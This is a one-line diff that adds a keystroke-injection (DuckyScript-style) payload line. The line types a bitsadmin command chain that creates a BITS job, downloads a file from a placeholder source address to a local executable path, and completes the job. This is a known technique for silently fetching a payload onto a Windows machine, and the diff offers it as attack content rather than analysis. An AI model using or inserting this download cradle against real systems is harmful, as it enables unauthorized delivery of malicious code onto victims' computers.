@@ -1,0 +1,1 @@
+STRINGLN bitsadmin /create 1 bitsadmin /addfile 1 ![$DS_SOURCE] ![$DS_EXECUTEABLE] bitsadmin /RESUME 1 bitsadmin /complete 1
